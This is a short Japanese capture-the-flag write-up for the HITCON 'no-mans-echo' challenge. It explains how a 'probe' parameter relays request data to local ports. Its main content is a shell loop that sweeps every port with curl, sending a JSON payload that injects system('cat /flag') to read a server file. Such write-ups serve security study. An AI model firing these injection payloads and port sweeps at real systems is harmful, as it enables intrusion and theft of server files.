https://chatgpt.com/c/68aabd0a-c4f0-832c-83cc-d872646c0fac

probeというクエリパラメータでポートを指定してやると、bodyに渡したjsonの一部をtcpでそのポートに転送してくれる感じ。

ポートを虱潰しでcurlしてやったら勝てた。

```shell
URL='http://no-mans-echo.chal.hitconctf.com/'
MAG='__HIT__'  # 目印
payload='{"signal":"Arrival","logogram":"echo \"__HIT__\\n\"; system('\''cat /flag'\'');"}'

export URL MAG payload

# 並列で 43 窓スキャン（全ポート網羅）
seq 1 43 65535 | xargs -n1 -P16 -I{} sh -c '
  out="$(curl -m2 -sS -X POST "$URL?probe={}" --data-binary "$payload"$'\''\n'\'')"
  if printf "%s" "$out" | grep -q "^$MAG"; then
    echo ">>> HIT probe={}"
    printf "%s\n" "$out" | sed -n "1,10p"   # 先頭10行だけ出す等、お好みで
  fi
'
```

これ、nmapとかでもやれたのかも。
-> 多分むり。繋いでる先がローカルのサーバーなので、nmapで外部からやるのは厳しいだろう。
-> 無理だった。nmapだと80しか空いてない。

